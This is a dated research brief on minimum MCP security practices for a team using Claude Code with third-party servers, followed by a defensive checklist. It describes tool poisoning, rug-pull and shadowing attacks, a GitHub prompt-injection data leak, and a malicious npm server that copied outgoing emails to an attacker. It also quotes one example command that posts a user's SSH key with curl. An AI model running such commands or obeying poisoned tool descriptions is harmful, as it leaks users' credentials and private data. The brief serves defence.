# Deepen-2: MCP security minimums for a hackathon team (Claude Code + third-party MCP)

Run date: 2026-09-22. Evidence retrieved this session only. Classes: T = threat/incident, G = official guidance, S = scanner/tool, D = derived practice.

## Findings

1. Invariant Labs defines three attacks. **Tool poisoning** hides instructions in tool descriptions that the model reads and the user does not see (their example steals SSH keys and config files). In a **rug pull**, "a malicious server can change the tool description after the client has already approved it". In **shadowing**, one server's descriptions change how the agent uses a different, trusted server. Mitigations it gives: tool/package pinning with hashes, cross-server dataflow controls. | https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks | Invariant Labs | 2025-04-01 | accessed 2026-09-22 | high | T
2. GitHub MCP "toxic agent flow" (May 2025): a malicious issue in a public repo injects a prompt into the agent. The agent then leaks private-repo data using the same GitHub token. Invariant calls this an architectural problem, not a server bug: "does not require the MCP tools themselves to be compromised". | https://invariantlabs.ai/blog/mcp-github-vulnerability (via search result summaries; also devclass.com 2025-05-27, docker.com "MCP Horror Stories") | Invariant Labs / DevClass / Docker | 2025-05 | accessed 2026-09-22 | high (multiple outlets agree; primary post seen as a search snippet, not fetched) | T
3. postmark-mcp was called the first real-world malicious MCP server on npm, found by Koi Security in Sep 2025. Someone copied Postmark's official server and published it to npm on 2025-09-15. The first 15 versions were clean. v1.0.16 added a BCC that sent every outgoing email to phan@giftshop.club. About 1,643 downloads. Advice: remove it, rotate credentials, check email logs. | https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html ; https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/ ; https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package | The Hacker News / Snyk / Postmark | 2025-09 | accessed 2026-09-22 | high (search snippets from several outlets, including the vendor) | T

The MCP spec's Security Best Practices page (draft) covers: confused deputy (OAuth proxy servers MUST get consent per client), token passthrough ("MCP servers MUST NOT accept any tokens that were not explicitly issued for the MCP server"), SSRF during OAuth discovery, state handle hijacking, local MCP server compromise, OAuth URL validation, stdio proxy escalation, mix-up attacks, localhost redirect impersonation, and scope minimization. | https://modelcontextprotocol.io/specification/draft/basic/security_best_practices | MCP project | draft, undated | accessed 2026-09-22 | high | G
6. On local server compromise, the spec says local servers "run with the same privileges as the client". Its example malicious startup command is `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa ...`. Clients MUST show the exact command before running it. They SHOULD sandbox servers, limit filesystem and network access, and warn about sudo, `rm -rf`, and access to home or SSH directories. Servers meant to run locally SHOULD use the stdio transport, or an auth token if they use HTTP. | same as #5 | MCP project | draft | accessed 2026-09-22 | high | G
7. On scope minimization, the spec says a stolen token with broad scopes (`files:*`, `admin:*`) widens the damage. It recommends starting with minimal scopes and asking for more only when needed, and lists wildcard or omnibus scopes as a common mistake. | same as #5 | MCP project | draft | accessed 2026-09-22 | high | G
8. Claude Code security page: in Manual mode Claude Code starts read-only and asks before edits and non-read-only Bash. Other modes: auto mode (a classifier reviews actions; ask/deny rules still apply) and Accept Edits. Other points: a sandboxed Bash tool (`/sandbox`) with filesystem and network isolation; `curl`/`wget` are not auto-approved; new MCP servers require trust verification, which is disabled with `-p`. It recommends VMs for untrusted work, dev containers, and auditing with `/permissions`. | https://code.claude.com/docs/en/security | Anthropic | current | accessed 2026-09-22 | high | G
9. On MCP servers, the same page says: "We encourage either writing your own MCP servers or using MCP servers from providers that you trust." Anthropic reviews Directory connectors against listing criteria "but does not security-audit or manage any MCP server". | same as #8 | Anthropic | current | accessed 2026-09-22 | high | G
10. Claude Code MCP docs: "Verify you trust each server before connecting it. Servers that fetch external content can expose you to prompt injection risk." Project `.mcp.json` servers need approval in interactive sessions but load without a prompt under `claude -p`, the Agent SDK, and cloud sessions. `claude mcp reset-project-choices` resets approvals. Other controls: `--strict-mcp-config`, `disabledMcpServers`, and managed `allowedMcpServers`/`deniedMcpServers`. Permission rules name tools as `mcp__<server>__<tool>`. Tool output over 10,000 tokens triggers a warning (default max 25,000, `MAX_MCP_OUTPUT_TOKENS`). Credential-like env vars (`*TOKEN*`, `*KEY*`, `ANTHROPIC_API_KEY`...) read as empty in a remote server's url/headers in `.mcp.json`. | https://code.claude.com/docs/en/mcp | Anthropic | current | accessed 2026-09-22 | high (a summarizing model extracted this; spot-check exact flag names) | G
11. The official GitHub MCP server has `--read-only` (env `GITHUB_READ_ONLY=1`), which takes priority over `--tools`. Toolsets can be restricted, and adding `/readonly` to the end of a remote toolset URL limits it to read tools. **Lockdown mode** only returns public-repo content from authors with push access, "a best-effort content filter intended to reduce the risk of prompt injection". Open issue #2156: `--read-only` does not restrict write tools under the new `http` command. | https://github.com/github/github-mcp-server (+ docs/server-configuration.md, issue #2156) | GitHub | current | accessed 2026-09-22 | medium-high (search snippets) | G
12. mcp-scan is now **Snyk Agent Scan** (`github.com/snyk/agent-scan`, Apache-2.0). It finds prompt injection, tool poisoning and shadowing, toxic flows, malware in skills, hardcoded secrets, and destructive capabilities. Run it with `uvx snyk-agent-scan@latest` or a release binary. It **needs a `SNYK_TOKEN`** and sends tool names, descriptions and MCP configs, with secrets redacted, to the Agent Scan API. Snyk says it does not store usage data. | https://github.com/invariantlabs-ai/mcp-scan (served snyk/agent-scan README) | Snyk | current | accessed 2026-09-22 | high on the command; "free" not confirmed (a Snyk account/token is required, tier not checked) | S

## Checklist (derived; minimum for a hackathon team)

1. **Allowlist a few servers.** Use official or first-party servers or ones you wrote (#9, #3). Don't install lookalike npm packages. Check the publisher matches the vendor (#3).
2. **Pin exact versions.** Use `npx -y pkg@1.2.3`, never `@latest`, in `.mcp.json`. Rug pulls and version-16 backdoors both target auto-updating (#1, #3, #4). Re-scan before bumping a version.
3. **Scan before first use and after changes.** Run `SNYK_TOKEN=<token> uvx snyk-agent-scan@latest` (#12). It sends tool descriptions to Snyk's API, so don't run it on configs that must stay confidential.
4. **Least-privilege tokens.** Use a fine-grained GitHub PAT limited to the hackathon repo(s), and narrow API keys with short expiry (#7, #2). Use a separate hackathon/dev account, not your personal or work account.
5. **Read-only by default.** For GitHub use `--read-only` / `GITHUB_READ_ONLY=1` or `/readonly` toolset URLs, plus lockdown mode for public repos (#11). Test that read-only actually holds on the HTTP transport (#11, issue #2156).
6. **Don't mix trust zones.** Don't give one session both a server that reads untrusted content (web, public issues, email) and a server holding private data or write access. Use separate sessions or `--strict-mcp-config` (#2, #10).
7. **Keep humans in the loop.** Stay in Manual mode for sessions with third-party MCP servers. Add `mcp__<server>__<write-tool>` to `permissions.deny` or `ask`. Don't use `bypassPermissions`. Read each tool call before approving (#8, #10).
8. **Sandbox.** Turn on `/sandbox`, or run in a dev container or VM, especially with local stdio servers, which run with your privileges (#6, #8).
9. **Review team-shared config.** Read `.mcp.json` diffs in PRs like code. Be careful with `claude -p` or CI, which load `.mcp.json` servers without asking (#10). If you're unsure, run `claude mcp reset-project-choices`.
10. **Keep secrets out of the repo.** Keep tokens in env vars with your own names, not in a committed `.mcp.json` (#10). Rotate everything after the event, and immediately if a package turns out to be compromised (#3).
